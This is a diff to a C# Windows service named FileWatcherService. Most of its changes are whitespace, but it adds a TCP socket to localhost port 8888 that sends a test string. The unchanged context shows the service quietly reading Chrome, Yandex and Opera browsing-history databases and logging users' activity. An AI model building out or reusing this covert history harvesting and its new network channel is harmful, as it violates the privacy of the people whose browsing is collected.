@@ -15,6 +15,7 @@ using System.Collections.ObjectModel;
 using System.Collections;
 using System.Management;
 using Microsoft.Win32;
+using System.Net.Sockets;
 
 namespace FileWatcherService
 {
@@ -39,8 +40,8 @@ namespace FileWatcherService
         {
             using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
             {
-                
-                    writer.WriteLine($"Выключил комп {this.UserName}!");
+
+                writer.WriteLine($"Выключил комп {this.UserName}!");
 
 
             }
@@ -51,7 +52,7 @@ namespace FileWatcherService
             GetUserName();
         }
 
-         
+
         private void GetUserName()
         {
             object obj = new object();
@@ -98,12 +99,20 @@ namespace FileWatcherService
     class Logger
     {
 
+        const int port = 8888;
+        const string address = "127.0.0.1";
         public string UserName { get; set; }
         object obj = new object();
         bool enabled = true;
+        TcpClient client = null;
 
         public Logger(string name)
         {
+            try
+            {
+                client = new TcpClient(address, port);
+            }
+            catch (Exception ex) { }
             UserName = name;
         }
 
@@ -244,6 +253,8 @@ namespace FileWatcherService
         public void Start()
         {
 
+            NetworkStream stream = client.GetStream();
+
             while (enabled)
             {
                 try
@@ -256,6 +267,9 @@ namespace FileWatcherService
                     copyHistoryOpera();
                     ReadOperaDataBase();
 
+                    byte[] data = Encoding.Unicode.GetBytes("Пожалуйста, работай");
+                    stream.Write(data, 0, data.Length);
+                    
                     GC.Collect();
                 }
                 catch (Exception d)
@@ -264,9 +278,9 @@ namespace FileWatcherService
                     RecordEntry(d.Source);
                 }
 
-                
-                
-                
+
+
+
 
 
             }
@@ -276,17 +290,17 @@ namespace FileWatcherService
         {
             try
             {
-                
+
                 if (File.Exists(databaseName))
                 {
-                    
+
                     string lastTime = null;
                     string tmpPath = "D:\\tmpGoogle.txt";
                     if (lastTime == null)
                         lastTime = DateTime.Now.ToString();
                     if (File.Exists(tmpPath))
                     {
-                        
+
                         using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                         {
                             // преобразуем строку в байты
@@ -298,32 +312,32 @@ namespace FileWatcherService
 
                         }
                     }
-                    
+
                     using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
                     {
-                        
+
                         connection.Open();
                         StringBuilder stringBuilder = new StringBuilder();
-                        
+
                         DbDataReader r = null;
-                        
+
                         if (DateTime.Parse(lastTime) < DateTime.Now)
                         {
-                            
+
                             r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
-                      
+
                         }
                         else
                         {
-                            
+
                             RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                             //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                             r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
-                           
+
                         }
                         if (r.HasRows)
                         {
-                            
+
                             while (r.Read())
                             {
                                 stringBuilder.Append("title:\t");
@@ -359,17 +373,17 @@ namespace FileWatcherService
         {
             try
             {
-                
+
                 if (File.Exists(YandexdatabaseName))
                 {
-                    
+
                     string lastTime = null;
                     string tmpPath = "D:\\tmpYandex.txt";
                     if (lastTime == null)
                         lastTime = DateTime.Now.ToString();
                     if (File.Exists(tmpPath))
                     {
-                        
+
                         using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                         {
                             // преобразуем строку в байты
@@ -381,32 +395,32 @@ namespace FileWatcherService
 
                         }
                     }
-                    
+
                     using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={YandexdatabaseName};")))
                     {
-                        
+
                         connection.Open();
                         StringBuilder stringBuilder = new StringBuilder();
-                        
+
                         DbDataReader r = null;
-                        
+
                         if (DateTime.Parse(lastTime) < DateTime.Now)
                         {
-                            
+
                             r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
-                      
+
                         }
                         else
                         {
-                            
+
                             RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                             //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                             r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
-                           
+
                         }
                         if (r.HasRows)
                         {
-                            
+
                             while (r.Read())
                             {
                                 stringBuilder.Append("title:\t");
@@ -526,14 +540,14 @@ namespace FileWatcherService
         }
 
 
-        public void RecordEntry(string fileEvent, bool isError  = true)
+        public void RecordEntry(string fileEvent, bool isError = true)
         {
             lock (obj)
             {
                 using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                 {
                     writer.WriteLine(String.Format("{0} под пользователем {1} {2}{3}",
-                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, isError == true ? " произошла ошибка ": "", fileEvent));
+                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, isError == true ? " произошла ошибка " : "", fileEvent));
                     writer.Flush();
                 }
             }
